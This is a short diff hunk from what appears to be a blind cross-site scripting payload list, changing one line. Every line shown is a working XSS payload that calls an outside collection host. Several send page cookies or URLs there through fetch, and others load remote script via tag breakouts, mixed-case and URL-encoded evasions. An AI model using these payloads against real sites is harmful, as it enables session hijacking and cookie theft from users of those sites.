@@ -46,7 +46,7 @@ javascript:fetch("https://xss.report/c/hnterx")
 <img src=x onerror="setTimeout(function(){fetch('https://xss.report/c/hnterx?data='+document.cookie)},10)"//>
 <input autofocus onfocus="fetch('https://xss.report/c/hnterx?token='+document.cookie)"//>
 <iframe src="javascript:void(0)" onload="fetch('https://xss.report/c/hnterx?url='+location.href)"//><!--" -->
-'"></title></textarea></script></style></noscript><script src=https://xss.report/c/hnterx></script>
+</noscript><script src=https://xss.report/c/hnterx></script>
 ibrahim'"<script src=https://xss.report/c/hnterx></script>
 hunter%27%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss.report%2Fc%2Fhnterx%3E%3C%2Fscript%3E
 --></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src=https://xss.report/c/hnterx></scrIpt>
